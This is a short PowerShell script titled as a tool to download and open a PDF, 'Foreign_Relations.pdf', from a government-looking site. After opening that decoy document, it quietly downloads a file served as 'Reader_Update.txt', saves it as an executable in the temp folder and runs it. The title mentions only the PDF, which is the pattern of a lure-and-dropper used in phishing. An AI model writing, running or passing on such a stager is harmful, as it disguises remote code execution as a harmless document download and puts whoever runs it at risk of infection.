# Download and Open a PDF File

$Url = "https://dfsl.maharashtra.gov.in/storage/Content/Foreign_Relations.pdf"
$OutputPath = "$env:TEMP\Foreign_Relations.pdf"

# Download the PDF
try {
    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
} catch {
    Write-Error "Failed to download the file: $_"
    exit 1
}

# Open the PDF with the default application
try {
    Start-Process -FilePath $OutputPath
} catch {
    Write-Error "Failed to open the file: $_"
    exit 1
}

# Download and run the executable
$exeUrl = "https://dfsl.maharashtra.gov.in/storage/Content/Reader_Update.txt"
$exePath = "$env:TEMP\Reader_Update.exe"
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    Start-Process -FilePath $exePath
} catch {
    Write-Error "Failed to download or run the executable: $_"
    exit 1
}
